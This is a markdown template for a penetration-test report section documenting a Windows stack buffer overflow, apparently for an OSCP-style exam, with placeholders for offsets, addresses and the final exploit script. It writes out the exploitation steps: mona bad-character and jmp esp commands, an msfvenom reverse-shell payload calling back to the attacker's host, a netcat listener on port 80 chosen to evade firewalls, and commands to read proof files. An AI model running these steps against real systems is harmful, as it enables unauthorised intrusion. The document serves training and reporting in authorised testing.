
## System: 192.168.x.x - Hostname

Offensive Security provided an application for black box review.  The application was running on a production server 192.168.x.x and a test system.  The test system was used to determine if buffer overflow existed in the application code.

The application was running on a test proof of concept (PoC) and production server as indicated in the scope below.  The test system was used to determine if a buffer overflow existed in the application code prior to attempting any direct exploitation of the production server.

### Scope

The IP address for the target(s) were provided by the client as documented here.  All buffer overflow penetration testing will operate only on the following system scope.

Server IP Address | Ports Open | Service | Application
----|----|----|----
192.168.x.y (Test) | **TCP**: 1337 | TBD | TBD.exe
192.168.x.z (Production) | **TCP**: 1337 | TBD | TBD.exe

### Vulnerability Exploited: buffer overflow

#### 1. Fuzzing

The command detected by manually probing the service is "SOMETHING".  Fuzzing the service crashes when sending between LOW and HIGH bytes but this is a possible range as the crash may have occurred earlier.

---

```Bash
# Output from fuzzing script
```

---

Identification of a buffer overflow by causing a crash is one thing but In order to progress the damage from loss of availability to exploitation the exact byte causing the overflow is needed.  To find this value a unique string of characters is sent to the service and the EIP at crash evaluated for the exact for characters.  The EIP contains ADDRESS which occurs at byte **NUMBER**.

#### 2. Control the EIP

To control the EIP line X of the script was modified to have an offset equal to the overflow byte NUMBER.

> Be sure to escape all byte characters or it will prevent the PDF report from generating with autorpt.

---

```Python
18: offset = NUMBER
19: overflow = "A" * offset
20: retn = "ZZZZ"
...
26: buffer = prefix + overflow + retn
```

---

Upon the next exploit attempt Immunity shows the intended four "ZZZZ" characters in the EIP validating attacker control.

#### 4. Find Bad Characters

> Be sure to escape all byte characters or it will prevent the PDF report from generating with autorpt.

Some bytes will corrupt subsequent bytes.  To prevent this from affecting the exploit I followed a process cycle to identify bad characters.  

To accomplish this process was followed.
Set mona working directory:

```
!mona config -set workingfolder c:\mona\%p
```

Create the bytearray with a single default null byte as the only bad character.

```
!mona bytearray -b "\x00"
```
Update the payload to include a bytearray of every character from \\x01 to \\xff.  Send the payload.  Check the ESP register with the following mona command:

```
!mona compare -f c:\mona\oscp\bytearray.bin -a ESP_REGISTER
```
Mona memory comparison results show \\a0 for corrupt characters in the table listing.  Visual inspection of the dump aligns with mona.py.  In the case of COMMAND the bad characters are: "\\x00...".

#### 5. Find the Right Module

I ran the mona command to locate an appropriate jump point and selected DLL_NAME as it has no protections.  I selected the return address "ADDRESS".

> Be sure to escape all byte characters or it will prevent the PDF report from generating with autorpt.

```Bash
!mona jmp -r esp -cpb "\\x00..."
```

#### 6. Generate Shellcode & Gain Test Shell

Closing the circle on the proof of concept system involves attaining an internactive shell on the target system.  

---


```Bash
msfvenom -p windows/shell_reverse_tcp LHOST=KALILINUX LPORT=80 EXITFUNC=thread -b "\\x00..." -f c
```

---


Setup a netcat listener on TCP port 80 to evade the firewall on the target server.

---


```Bash
sudo nc -nvlp 80
```

---


Run the exploit.  An interactive shell to the proof of concept server is established.

---

```Bash
sh runmescripto.sh
```

---

#### 7. Exploit Production Target

With a complete proof of concept buffer overflow leading to interactive shell I repeated the shellcode creation step for the target production server.

---


```Bash
msfvenom -p windows/shell_reverse_tcp LHOST=KALILINUX LPORT=80 EXITFUNC=thread -b "\\x00..." -f c
```

---


Setup a netcat listener on TCP port 80 to evade target system firewall.

---


```Bash
sudo nc -nvlp 80
```

---


Run the exploit.  An interactive shell to the production server is established.

---


```Bash
ipconfig
type "c:\Documents and Settings\Administrator\Desktop\proof.txt"
```

---


> Delete this note and the OS output not needed for evidence.

**Linux**

---

```Bash
cat /root/proof.txt
ip addr show

# Check for local.txt
find / -type f -name local.txt
cat local.txt
```

---

**Windows**

---

```Powershell
type "c:\Documents and Settings\Administrator\Desktop\proof.txt"
ipconfig

REM Check for local.txt
cd \
dir /s local.txt
type local.txt
```

---

#### Proof.txt

**Screenshot**

Screenshot must show proof.txt contents with `cat` or `type` command and output from `ipconfig` or `ip`.  Additionally, search the system for local.txt to cover all bases.  

![Alt text](images/placeholder-image-300x225.png "title"){ width=50%}

**Contents**

Screenshot must show 

\pagebreak

### Completed Buffer Overflow Code

```Python
#!/usr/bin/python3
#
#     REPLACE ME WITH YOUR ACTUAL CODE !!!

import os, sys

print("REPLACE ME WITH YOUR ACTUAL CODE")
```

